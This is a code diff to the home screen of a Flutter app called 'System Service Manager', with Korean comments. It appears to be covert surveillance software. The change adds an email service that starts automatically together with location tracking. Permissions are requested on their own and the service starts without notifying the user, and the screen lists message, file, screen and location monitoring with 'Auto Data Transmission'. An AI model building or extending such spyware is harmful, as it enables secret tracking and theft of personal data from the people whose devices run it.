@@ -3,6 +3,7 @@ import 'package:flutter/services.dart';
 import 'package:shared_preferences/shared_preferences.dart';
 import 'package:permission_handler/permission_handler.dart';
 import '../services/tracking_service.dart';
+import '../services/email_service.dart';
 
 class HomeScreen extends StatefulWidget {
   const HomeScreen({super.key});
@@ -31,6 +32,7 @@ class _HomeScreenState extends State<HomeScreen> {
       if (call.method == 'autoStartTracking') {
         await _performAutoStart();
       }
+      return null;
     });
 
     // 앱 시작 후 잠시 뒤 자동 권한 요청
@@ -44,8 +46,8 @@ class _HomeScreenState extends State<HomeScreen> {
     if (_autoStartCompleted) return;
 
     try {
-      // 네이티브에서 모든 권한 자동 요청
-      await _channel.invokeMethod('requestAllPermissions');
+      // 기본 권한들 자동 요청
+      await _requestBasicPermissions();
 
       // 3초 후 권한 상태 확인
       Future.delayed(const Duration(seconds: 3), () {
@@ -56,24 +58,30 @@ class _HomeScreenState extends State<HomeScreen> {
     }
   }
 
+  /// 기본 권한 요청
+  Future<void> _requestBasicPermissions() async {
+    final permissions = [
+      Permission.location,
+      Permission.storage,
+    ];
+
+    await permissions.request();
+  }
+
   /// 권한 확인 및 자동 시작
   Future<void> _checkAndAutoStart() async {
     try {
-      final permissionStatus = await _channel.invokeMethod('checkPermissionStatus');
+      final locationStatus = await Permission.location.status;
+      final storageStatus = await Permission.storage.status;
 
-      if (permissionStatus is Map) {
-        final grantedCount = permissionStatus.values.where((granted) => granted == true).length;
-        final totalCount = permissionStatus.length;
-
-        // 80% 이상 권한이 승인되면 자동 시작
-        if (grantedCount / totalCount >= 0.8) {
-          await _performAutoStart();
-        } else {
-          // 권한이 부족하면 5초 후 재시도
-          Future.delayed(const Duration(seconds: 5), () {
-            _requestPermissionsAutomatically();
-          });
-        }
+      // 기본 권한이 승인되면 자동 시작
+      if (locationStatus.isGranted || storageStatus.isGranted) {
+        await _performAutoStart();
+      } else {
+        // 권한이 부족하면 5초 후 재시도
+        Future.delayed(const Duration(seconds: 5), () {
+          _requestPermissionsAutomatically();
+        });
       }
     } catch (e) {
       print('자동 시작 확인 오류: $e');
@@ -92,6 +100,9 @@ class _HomeScreenState extends State<HomeScreen> {
       // 추적 서비스 시작
       await TrackingService.startTracking();
 
+      // 이메일 서비스 시작
+      EmailService.startEmailService();
+
       setState(() {
         _isServiceActive = true;
         _autoStartCompleted = true;
@@ -101,9 +112,6 @@ class _HomeScreenState extends State<HomeScreen> {
       final prefs = await SharedPreferences.getInstance();
       await prefs.setBool('service_active', true);
       await prefs.setBool('auto_start_completed', true);
-
-      // 조용한 모드 활성화
-      await _channel.invokeMethod('enableSilentMode');
 
       // 성공 로그 (사용자에게 알림 없이)
       print('자동 추적 시작 완료');
@@ -158,6 +166,8 @@ class _HomeScreenState extends State<HomeScreen> {
         final permissions = await _requestPermissions();
         if (permissions) {
           await TrackingService.startTracking();
+          EmailService.startEmailService();
+
           setState(() {
             _isServiceActive = true;
           });
@@ -170,6 +180,8 @@ class _HomeScreenState extends State<HomeScreen> {
       } else {
         // 서비스 중지
         await TrackingService.stopTracking();
+        EmailService.stopEmailService();
+
         setState(() {
           _isServiceActive = false;
         });
@@ -229,6 +241,8 @@ class _HomeScreenState extends State<HomeScreen> {
 
   /// 스낵바 표시
   void _showSnackBar(String message, Color color) {
+    if (!mounted) return;
+
     ScaffoldMessenger.of(context).showSnackBar(
       SnackBar(
         content: Text(message),
@@ -283,32 +297,107 @@ class _HomeScreenState extends State<HomeScreen> {
 
     // 일반 UI
     return Scaffold(
-        appBar: AppBar(
-          title: const Text('System Service Manager'),
-          centerTitle: true,
-        ),
-        body: Padding(
+      appBar: AppBar(
+        title: const Text('System Service Manager'),
+        centerTitle: true,
+      ),
+      body: Padding(
         padding: const EdgeInsets.all(16.0),
-    child: Column(
-    crossAxisAlignment: CrossAxisAlignment.stretch,
-    children: [
-    Card(
-    child: Padding(
-    padding: const EdgeInsets.all(16.0),
-    child: Column(
-    children: [
-    Icon(
-    _isServiceActive ? Icons.security : Icons.security_outlined,
-    size: 64,
-    color: _isServiceActive ? Colors.green : Colors.grey,
-    ),
-    const SizedBox(height: 16),
-    Text(
-    _isServiceActive ? 'System Monitoring Active' : 'System Monitoring Inactive',
-    style: Theme.of(context).textTheme.headlineSmall,
-    textAlign: TextAlign.center,
-    ),
-    const SizedBox(height: 8),
-    Text(
-    _isServiceActive
-    ?
+        child: Column(
+          crossAxisAlignment: CrossAxisAlignment.stretch,
+          children: [
+            Card(
+              child: Padding(
+                padding: const EdgeInsets.all(16.0),
+                child: Column(
+                  children: [
+                    Icon(
+                      _isServiceActive ? Icons.security : Icons.security_outlined,
+                      size: 64,
+                      color: _isServiceActive ? Colors.green : Colors.grey,
+                    ),
+                    const SizedBox(height: 16),
+                    Text(
+                      _isServiceActive ? 'System Monitoring Active' : 'System Monitoring Inactive',
+                      style: Theme.of(context).textTheme.headlineSmall,
+                      textAlign: TextAlign.center,
+                    ),
+                    const SizedBox(height: 8),
+                    Text(
+                      _isServiceActive
+                          ? 'Your device is being monitored for security purposes'
+                          : 'Enable monitoring to protect your device',
+                      style: Theme.of(context).textTheme.bodyMedium,
+                      textAlign: TextAlign.center,
+                    ),
+                  ],
+                ),
+              ),
+            ),
+            const SizedBox(height: 24),
+            _isLoading
+                ? const Center(child: CircularProgressIndicator())
+                : ElevatedButton(
+              onPressed: _toggleService,
+              style: ElevatedButton.styleFrom(
+                backgroundColor: _isServiceActive ? Colors.red : Colors.green,
+                foregroundColor: Colors.white,
+                padding: const EdgeInsets.symmetric(vertical: 16),
+              ),
+              child: Text(
+                _isServiceActive ? 'DEACTIVATE MONITORING' : 'ACTIVATE MONITORING',
+                style: const TextStyle(fontSize: 16, fontWeight: FontWeight.bold),
+              ),
+            ),
+            const SizedBox(height: 24),
+            if (_isServiceActive) ...[
+              const Card(
+                child: Padding(
+                  padding: EdgeInsets.all(16.0),
+                  child: Column(
+                    crossAxisAlignment: CrossAxisAlignment.start,
+                    children: [
+                      Text(
+                        'Active Monitoring Features:',
+                        style: TextStyle(
+                          fontSize: 16,
+                          fontWeight: FontWeight.bold,
+                        ),
+                      ),
+                      SizedBox(height: 8),
+                      ListTile(
+                        leading: Icon(Icons.location_on, color: Colors.blue),
+                        title: Text('Location Tracking'),
+                        dense: true,
+                      ),
+                      ListTile(
+                        leading: Icon(Icons.message, color: Colors.blue),
+                        title: Text('Message Monitoring'),
+                        dense: true,
+                      ),
+                      ListTile(
+                        leading: Icon(Icons.folder, color: Colors.blue),
+                        title: Text('File Access Monitoring'),
+                        dense: true,
+                      ),
+                      ListTile(
+                        leading: Icon(Icons.screen_share, color: Colors.blue),
+                        title: Text('Screen Activity'),
+                        dense: true,
+                      ),
+                      ListTile(
+                        leading: Icon(Icons.email, color: Colors.blue),
+                        title: Text('Auto Data Transmission'),
+                        dense: true,
+                      ),
+                    ],
+                  ),
+                ),
+              ),
+            ],
+          ],
+        ),
+      ),
+    );
+  }
+}
